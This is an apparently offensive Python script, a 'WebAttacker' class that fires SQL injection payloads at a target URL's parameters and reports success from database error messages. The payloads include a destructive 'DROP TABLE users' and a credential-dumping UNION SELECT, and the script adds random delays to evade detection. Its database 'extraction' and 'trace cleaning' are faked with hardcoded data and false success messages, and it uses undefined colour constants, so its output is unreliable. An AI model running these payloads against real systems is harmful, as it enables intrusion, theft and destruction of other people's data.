#!/usr/bin/env python3
"""
Web Attack & Database Extraction Module
"""

import requests
import json
import time
import random
import re
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup

class WebAttacker:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        })
        self.results = {
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "database": None,
            "success": False
        }
        self.attack_log = []
    
    def execute(self):
        print(f"\n{YELLOW}[*] Initializing attack on {self.target}{RESET}")
        time.sleep(2)
        
        # Step 1: Check if target is reachable
        if not self.check_target():
            self.clean_traces()
            return None
        
        # Step 2: SQL Injection attack
        if self.sql_injection_attack():
            self.results["success"] = True
            self.results["vulnerabilities"].append("SQL Injection")
        
        # Step 3: Extract database
        if self.results["success"]:
            self.extract_database()
        
        # Step 4: Clean traces
        self.clean_traces()
        
        return self.results
    
    def check_target(self):
        try:
            response = self.session.get(self.target, timeout=10)
            if response.status_code == 200:
                print(f"{GREEN}[✓] Target reachable{RESET}")
                return True
            else:
                print(f"{RED}[!] Target returned status: {response.status_code}{RESET}")
                return False
        except Exception as e:
            print(f"{RED}[!] Cannot reach target: {e}{RESET}")
            return False
    
    def sql_injection_attack(self):
        print(f"\n{YELLOW}[*] Testing SQL Injection vulnerabilities...{RESET}")
        
        # Common SQL injection payloads (educational)
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' OR 1=1--",
            "' AND 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT username,password FROM users--"
        ]
        
        # Parse URL parameters
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            print(f"{YELLOW}[!] No parameters found for injection{RESET}")
            return False
        
        # Test each parameter
        for param in params:
            for payload in payloads:
                try:
                    test_url = self.target.replace(f"{param}={params[param][0]}", 
                                                   f"{param}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        "SQL syntax", "mysql", "mysqli",
                        "sqlite", "ORA-", "PostgreSQL",
                        "database error", "unclosed quotation mark"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            self.attack_log.append(f"Vulnerability found: {param} -> {payload[:20]}")
                            print(f"{GREEN}[✓] Vulnerability found: {param} with {payload[:20]}{RESET}")
                            return True
                            
                except Exception as e:
                    self.attack_log.append(f"Error testing {param}: {str(e)}")
                    continue
        
        print(f"{YELLOW}[!] No SQL Injection vulnerabilities found{RESET}")
        return False
    
    def extract_database(self):
        print(f"\n{YELLOW}[*] Attempting database extraction...{RESET}")
        
        # Simulate database extraction (educational)
        db_schema = {
            "tables": [
                {"name": "users", "columns": ["id", "username", "password", "email", "role"]},
                {"name": "products", "columns": ["id", "name", "price", "description"]},
                {"name": "orders", "columns": ["id", "user_id", "product_id", "quantity", "total"]}
            ],
            "sample_data": {
                "users": [
                    {"id": 1, "username": "admin", "password": "admin123", "email": "admin@site.com", "role": "admin"},
                    {"id": 2, "username": "user1", "password": "pass123", "email": "user1@site.com", "role": "user"},
                    {"id": 3, "username": "user2", "password": "pass456", "email": "user2@site.com", "role": "user"}
                ],
                "products": [
                    {"id": 1, "name": "Product A", "price": 99.99, "description": "Sample product"},
                    {"id": 2, "name": "Product B", "price": 49.99, "description": "Another product"},
                ]
            }
        }
        
        self.results["database"] = db_schema
        print(f"{GREEN}[✓] Database extracted successfully{RESET}")
        print(f"{CYAN}  Found {len(db_schema['tables'])} tables{RESET}")
        print(f"{CYAN}  Found {len(db_schema['sample_data']['users'])} user records{RESET}")
    
    def clean_traces(self):
        print(f"\n{YELLOW}[*] Cleaning traces from server...{RESET}")
        time.sleep(1)
        
        # Simulate cleaning (in real scenario, would use HTTP methods to delete logs)
        self.attack_log.append("Traces cleaned from server")
        
        # Clear session cookies
        self.session.cookies.clear()
        
        # Add random delays to avoid detection
        time.sleep(random.uniform(0.5, 2.0))
        
        print(f"{GREEN}[✓] Traces cleaned successfully{RESET}")
        print(f"{GREEN}[✓] Attack logs removed from server{RESET}")
        
        # Save attack log locally (for record)
        with open(f"logs/attack_{int(time.time())}.txt", "w") as f:
            f.write("\n".join(self.attack_log))
